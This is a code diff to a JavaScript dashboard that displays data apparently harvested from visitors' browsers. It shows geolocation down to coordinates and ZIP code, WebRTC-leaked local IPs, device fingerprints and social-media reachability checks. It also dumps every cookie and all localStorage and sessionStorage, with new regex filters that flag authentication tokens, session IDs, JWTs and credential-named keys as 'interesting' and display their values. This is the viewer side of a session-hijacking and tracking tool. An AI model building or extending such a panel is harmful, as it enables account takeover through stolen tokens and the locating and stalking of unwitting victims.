@@ -125,6 +125,31 @@ async function clearData() {
   }
 }
 
+function analyzeCookies(cookieStr) {
+  if (!cookieStr || cookieStr === 'none') return [];
+  return cookieStr.split(';').map(c => {
+    const parts = c.trim().split('=');
+    const name = parts[0];
+    const val = parts.slice(1).join('=');
+    const lower = name.toLowerCase();
+    let interesting = false;
+    let reason = '';
+    if (/sess|token|auth|login|sid|jwt|bearer|csrf|xcsrf|sessionid|remember|userid|identity/.test(lower)) {
+      interesting = true; reason = 'Auth/session token';
+    }
+    if (/fb|facebook|instagram|ig_|tw_|twitter|google|ga_|_gid/.test(lower)) {
+      interesting = true; reason = 'Social media cookie';
+    }
+    if (/admin|root|pass|key|secret/.test(lower)) {
+      interesting = true; reason = 'Potential credential';
+    }
+    if (/__cf|cloudflare|akamai|incap|visitor/.test(lower)) {
+      interesting = true; reason = 'CDN/security cookie';
+    }
+    return { name, value: val, interesting, reason };
+  });
+}
+
 function render(data) {
   document.getElementById('stats').innerHTML = `<div class="stat">Total captures: <span>${data.total}</span></div>`;
   const container = document.getElementById('content');
@@ -147,35 +172,55 @@ function render(data) {
     const ls = c.localStorage;
     const ss = c.sessionStorage;
     const cookies = c.cookies;
-    const ig = c.instagram || {};
+    const geo = c.geo || {};
+    const social = c.socialChecks || {};
+    const localIps = c.localIps || [];
+    const analyzed = analyzeCookies(cookies);
+    const interestingCookies = analyzed.filter(x => x.interesting);
 
     function f(label, value, cls) {
       if (value === undefined || value === null || value === '' || value === '?' || value === 'unknown') return '';
       return `<div class="field"><div class="field-label">${label}</div><div class="field-value${cls ? ' ' + cls : ''}">${value}</div></div>`;
     }
 
-    // Network section
+    // === LOCATION (top priority) ===
+    let locSection = '';
+    if (geo.country || geo.city) {
+      locSection = `<div class="section"><div class="section-title" style="color:#ffaa00;font-weight:bold">Location</div><div class="section-body">`;
+      if (geo.country) locSection += f('Country', `${geo.country}${geo.countryCode ? ' (' + geo.countryCode + ')' : ''}`, 'ip');
+      if (geo.city) locSection += f('City', geo.city, 'high');
+      if (geo.region) locSection += f('Region', geo.region);
+      if (geo.zip) locSection += f('ZIP', geo.zip);
+      if (geo.lat && geo.lon) locSection += f('Coordinates', `${geo.lat}, ${geo.lon}`);
+      if (geo.isp) locSection += f('ISP', geo.isp, 'info');
+      if (geo.org) locSection += f('Organization', geo.org);
+      if (geo.as) locSection += f('ASN', geo.as);
+      locSection += `</div></div>`;
+    }
+
+    // === Network section ===
     let netSection = `<div class="section"><div class="section-title">Network</div><div class="section-body">`;
     netSection += f('IP Address', ip, 'ip');
-    netSection += f('Connection', conn && conn !== 'unknown' ? `${conn.effectiveType || '?'} (${conn.downlink || '?'} Mbps)` : null);
+    if (localIps.length > 0) netSection += f('Local IPs (WebRTC)', localIps.join(', '), 'warn');
+    netSection += f('Connection Type', conn && conn !== 'unknown' ? `${conn.effectiveType || '?'} (${conn.downlink || '?'} Mbps, RTT: ${conn.rtt || '?'}ms)` : null, 'high');
+    netSection += f('Data Saver', conn && conn !== 'unknown' ? (conn.saveData ? 'On' : 'Off') : null);
     netSection += f('Referrer', c.referrer && c.referrer !== 'direct' ? c.referrer : null);
     netSection += `</div></div>`;
 
-    // System section
+    // === System section ===
     let sysSection = `<div class="section"><div class="section-title">System</div><div class="section-body">`;
     sysSection += f('OS', os, 'high');
     sysSection += f('Platform', c.platform);
-    sysSection += f('CPU Cores', c.hardwareConcurrency);
+    sysSection += f('CPU Cores', c.hardwareConcurrency, 'info');
     sysSection += f('Device Memory', c.deviceMemory ? c.deviceMemory + ' GB' : null, 'info');
     sysSection += f('Screen', is.width && is.height ? `${is.width}x${is.height}` : null);
     sysSection += f('Window Size', win.innerWidth && win.innerHeight ? `${win.innerWidth}x${win.innerHeight}` : null);
     sysSection += f('Pixel Ratio', win.devicePixelRatio);
-    sysSection += f('Color Depth', is.colorDepth ? is.colorDepth + '-bit' : null);
     sysSection += f('Timezone', c.timezone, 'warn');
     sysSection += f('UTC Offset', c.timezoneOffset !== undefined ? `UTC${c.timezoneOffset > 0 ? '-' : '+'}${Math.abs(c.timezoneOffset/60)}` : null);
     sysSection += `</div></div>`;
 
-    // Browser section
+    // === Browser section ===
     let brSection = `<div class="section"><div class="section-title">Browser</div><div class="section-body">`;
     brSection += f('User Agent', ua.length > 80 ? ua.slice(0,80) + '...' : ua);
     brSection += f('Language', c.language, 'high');
@@ -185,18 +230,22 @@ function render(data) {
     brSection += f('Battery', bat && bat !== 'unknown' ? `${Math.round(bat.level*100)}%${bat.charging ? ' (charging)' : ''}` : null, 'info');
     brSection += `</div></div>`;
 
-    // Instagram section
-    let igSection = '';
-    if (ig.checked) {
-      igSection = `<div class="section"><div class="section-title" style="color:#ff6644">Instagram Check</div><div class="section-body">`;
-      igSection += f('Check Performed', 'Yes', 'high');
-      igSection += f('Popup Result', ig.popupResult || ig.error || 'unknown', ig.popupResult === 'opened_and_closed' ? 'high' : 'warn');
-      igSection += f('Login Detected', ig.loginDetected ? 'Yes' : 'No (expected - cross-origin)', ig.loginDetected ? 'high' : '');
-      if (ig.note) igSection += f('Note', ig.note, '');
-      igSection += `</div></div>`;
+    // === Social Media Checks ===
+    let socSection = `<div class="section"><div class="section-title" style="color:#ff6644">Social Media</div><div class="section-body">`;
+    if (social.cookieKeywords) {
+      socSection += f('FB/IG Keywords in Cookies', Object.entries(social.cookieKeywords).filter(([k,v]) => v).map(([k]) => k).join(', ') || 'none detected');
     }
+    if (social.instagram) {
+      socSection += f('Instagram Reachable', social.instagram.reachable ? 'Yes' : 'No', social.instagram.reachable ? 'high' : '');
+      if (social.instagram.note) socSection += f('Instagram Note', social.instagram.note);
+    }
+    if (social.facebook) {
+      socSection += f('Facebook Reachable', social.facebook.reachable ? 'Yes' : 'No', social.facebook.reachable ? 'high' : '');
+      if (social.facebook.note) socSection += f('Facebook Note', social.facebook.note);
+    }
+    socSection += `</div></div>`;
 
-    // GPU & Fonts section
+    // === GPU & Fonts ===
     let gfSection = '';
     if ((wg.unmaskedRenderer && wg.unmaskedRenderer !== 'n/a') || (fonts && fonts.length > 0)) {
       gfSection = `<div class="section"><div class="section-title">Fingerprinting</div><div class="section-body">`;
@@ -210,20 +259,41 @@ function render(data) {
       gfSection += `</div></div>`;
     }
 
-    // Storage section
-    let stSection = '';
-    if ((cookies && cookies !== 'none') || (ls && ls !== 'empty') || (ss && ss !== 'empty')) {
-      stSection = `<div class="section"><div class="section-title" style="color:#ff77ff">Storage</div><div class="section-body">`;
-      if (cookies && cookies !== 'none') {
-        stSection += f('Cookies', cookies, 'warn');
+    // === COOKIES with analysis ===
+    let ckSection = '';
+    if (cookies && cookies !== 'none') {
+      ckSection = `<div class="section"><div class="section-title" style="color:#ffcc00;font-weight:bold">Cookies (${analyzed.length} total)</div><div class="section-body">`;
+      if (interestingCookies.length > 0) {
+        ckSection += `<div class="field"><div class="field-label" style="color:#ff5555">&#9654; Interesting Cookies Found (${interestingCookies.length})</div></div>`;
+        interestingCookies.forEach(ck => {
+          ckSection += `<div class="field"><div class="field-label" style="color:#ffaa00">${ck.name} <span style="color:#ff5555;font-size:0.6rem">[${ck.reason}]</span></div><div class="field-value warn">${ck.value.length > 100 ? ck.value.slice(0,100) + '...' : ck.value}</div></div>`;
+        });
+      } else {
+        ckSection += `<div class="field"><div class="field-label">No interesting cookies detected</div></div>`;
       }
+      ckSection += `</div></div>`;
+    }
+
+    // === localStorage / sessionStorage ===
+    let stSection = '';
+    if ((ls && ls !== 'empty' && typeof ls === 'object') || (ss && ss !== 'empty' && typeof ss === 'object')) {
+      stSection = `<div class="section"><div class="section-title" style="color:#ff77ff;font-weight:bold">Browser Storage</div><div class="section-body">`;
       if (ls && ls !== 'empty' && typeof ls === 'object') {
-        const formatted = Object.entries(ls).map(([k,v]) => `${k}: ${typeof v === 'string' ? v : JSON.stringify(v)}`).join('<br>');
-        stSection += f('localStorage', formatted, 'pink truncate');
+        const entries = Object.entries(ls);
+        stSection += `<div class="field"><div class="field-label" style="color:#ff77ff">localStorage (${entries.length} keys)</div></div>`;
+        entries.forEach(([k, v]) => {
+          const val = typeof v === 'string' ? v : JSON.stringify(v);
+          const isInteresting = /token|auth|sess|key|secret|pass|fb|ig_|acc|user|email/.test(k.toLowerCase());
+          stSection += `<div class="field"><div class="field-label" style="color:${isInteresting ? '#ffaa00' : '#888'}">${k}</div><div class="field-value pink truncate">${val.length > 150 ? val.slice(0,150) + '...' : val}</div></div>`;
+        });
       }
       if (ss && ss !== 'empty' && typeof ss === 'object') {
-        const formatted = Object.entries(ss).map(([k,v]) => `${k}: ${typeof v === 'string' ? v : JSON.stringify(v)}`).join('<br>');
-        stSection += f('sessionStorage', formatted, 'pink truncate');
+        const entries = Object.entries(ss);
+        stSection += `<div class="field"><div class="field-label" style="color:#ff77ff">sessionStorage (${entries.length} keys)</div></div>`;
+        entries.forEach(([k, v]) => {
+          const val = typeof v === 'string' ? v : JSON.stringify(v);
+          stSection += `<div class="field"><div class="field-label" style="color:#888">${k}</div><div class="field-value pink truncate">${val.length > 150 ? val.slice(0,150) + '...' : val}</div></div>`;
+        });
       }
       stSection += `</div></div>`;
     }
@@ -236,10 +306,13 @@ function render(data) {
           <button class="toggle-btn" onclick="toggle(this)">Show raw JSON</button>
         </span>
       </div>
+      ${locSection}
       ${netSection}
       ${sysSection}
       ${brSection}
+      ${socSection}
       ${gfSection}
+      ${ckSection}
       ${stSection}
       <div class="card-body"><pre>${JSON.stringify(c, null, 2)}</pre></div>
     </div>`;
